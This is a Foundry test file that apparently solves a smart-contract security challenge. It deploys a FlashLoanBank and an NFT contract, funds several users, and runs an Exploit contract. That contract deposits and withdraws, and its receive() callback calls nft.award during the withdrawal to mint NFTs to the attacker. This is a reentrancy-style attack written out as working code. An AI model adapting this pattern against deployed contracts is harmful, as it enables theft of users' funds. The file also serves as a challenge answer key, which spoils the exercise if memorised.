// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/Challenge.sol";

contract CounterTest is Test {
    
    FlashLoanBank internal flashLoanBank;
    NFT internal nft;

    address internal  user1;
    address internal  user2;
    address internal  user3;
    address internal  user4;
    address internal  attacker;

    function setUp() public {
        flashLoanBank = new FlashLoanBank();
        nft = new NFT(flashLoanBank);

        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        user4 = makeAddr("user4");
        attacker = makeAddr("attacker");

        deal(user1, 2 ether);
        deal(user2, 2 ether);
        deal(user3, 2 ether);
        deal(user4, 2 ether);
        deal(attacker, 2 ether);

        vm.prank(user1);
        flashLoanBank.deposit{value: 2 ether}();

        vm.prank(user2);
        flashLoanBank.deposit{value: 2 ether}();

        vm.prank(user3);
        flashLoanBank.deposit{value: 2 ether}();

        vm.prank(user4);
        flashLoanBank.deposit{value: 2 ether}();
    }

    function validation() public {
        assertEq(nft.balanceOf(attacker), 2);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Exploit exploit = new Exploit(flashLoanBank, nft);
        exploit.deposit{value: address(attacker).balance}();
        exploit.withdraw();
        vm.stopPrank();

        validation();
    }
    
}


contract Exploit {

    FlashLoanBank internal flashLoanBank;

    NFT internal nft;

    constructor(FlashLoanBank _flashLoanBank, NFT _nft) payable {
        flashLoanBank = _flashLoanBank;
        nft = _nft;
    }

    function deposit() external payable {
        flashLoanBank.deposit{value: address(this).balance}();
    }

    function withdraw() external {
        flashLoanBank.approve(address(flashLoanBank), type(uint256).max);
        flashLoanBank.withdraw();
    }

    receive() external payable{
        nft.award{value: address(this).balance}(2);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4){
            return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
        }
}
